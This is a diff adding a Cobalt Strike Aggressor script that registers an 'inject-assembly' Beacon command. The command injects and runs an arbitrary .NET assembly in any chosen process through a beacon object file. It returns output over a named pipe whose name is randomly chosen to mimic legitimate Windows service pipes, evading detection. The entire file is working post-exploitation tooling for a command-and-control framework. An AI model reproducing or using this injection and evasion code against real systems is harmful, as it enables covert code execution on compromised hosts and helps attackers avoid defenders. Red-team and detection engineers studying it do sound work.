@@ -1,0 +1,105 @@
+import beacon.CommandBuilder;
+import common.CommonUtils;
+
+# https://github.com/Tylous/SourcePoint/blob/main/Loader/Loader.go#L134
+sub random_pipe {
+    @pipename_list = @();
+    add(@pipename_list, "SapIServerPipes-1-5-5-0");
+    add(@pipename_list, "epmapper-");
+    add(@pipename_list, "atsvc-");
+    add(@pipename_list, "plugplay+");
+    add(@pipename_list, "srvsvc-1-5-5-0");
+    add(@pipename_list, "W32TIME_ALT_");
+    add(@pipename_list, "tapsrv_");
+    add(@pipename_list, "Printer_Spools_");
+
+    return @pipename_list[rand(8)].rand(10).rand(10).rand(10).rand(10);
+}
+
+alias inject-assembly {
+    $cmd = substr($0, 16);
+    @args = split(' ', $cmd); 
+    $pid = @args[0];
+
+
+    $barch = barch( $1 );
+    $iafs = openf( script_resource( "injectassembly. $+ $barch $+ .o") );
+    $iarw = readb( $iafs, -1 );
+    closef( $iafs );
+
+    if ( @args[0] eq $null || @args[1] eq $null)
+    {
+        berror( $1, "Usage: inject-assembly pid assembly [args...]\n" );
+        return;
+    }
+
+    if ( !-isnumber $pid )
+    {
+        berror( $1, "Invalid PID: $pid\n" );
+        return;
+    }
+    else
+    {
+        if ( $pid eq 0 )
+        {
+            $pid = beacon_info( $1, "pid" );
+        }
+    }
+
+    if ( !-exists @args[1] || !-isFile @args[1] )
+    {
+        berror($1, "Assembly file not found: ".@args[1]."\n");
+        return;
+    }
+
+    $asmfs = openf( @args[1] );
+    $asmrw = readb( $asmfs, -1 );
+    $asmsize = strlen($asmrw);
+    closef( $asmfs );
+
+    @asmargarr = sublist(@args, 2, size(@args));
+    $asmargs = "";
+    foreach %arg (@asmargarr)
+    {
+        if ( !$asmargs )
+        {
+            $asmargs = %arg;
+        }
+        else
+        {
+            $asmargs = $asmargs . " " . %arg;
+        }
+    }
+
+    if ( !$asmargs )
+    {
+        $asmargs = "NOARGS";
+    }
+
+    $pipen = "\\\\.\\pipe\\".random_pipe();
+
+    #btask($1, "Assembly Path: ".@args[1]);
+    #btask($1, "Size: ".$asmsize);
+    #btask($1, "Pipe: ".$pipen);
+    #btask($1, "Args: ".$asmargs);
+
+    $argvs = bof_pack( $1, "zzzbz", $pid, $pipen, $asmsize, $asmrw, $asmargs );
+    beacon_inline_execute( $1, $iarw, "go", $argvs );
+
+    $build = [ new CommandBuilder ];
+    [$build setCommand: 40];
+    [$build addInteger: 0];
+    [$build addShort: 32];
+    [$build addShort: 15000];
+    [$build addLengthAndString: $pipen];
+    [$build addLengthAndString: "inject-assembly ".@args[1]];
+    call( "beacons.task", $null, $1, cast( [$build build], 'b' ) );
+}
+
+beacon_command_register(
+    "inject-assembly",
+    "Execute a .NET assembly in any process",
+    "  Usage: inject-assembly pid assembly [args...]\n".
+    "  Specify 0 for pid to run in the current process"
+);
+
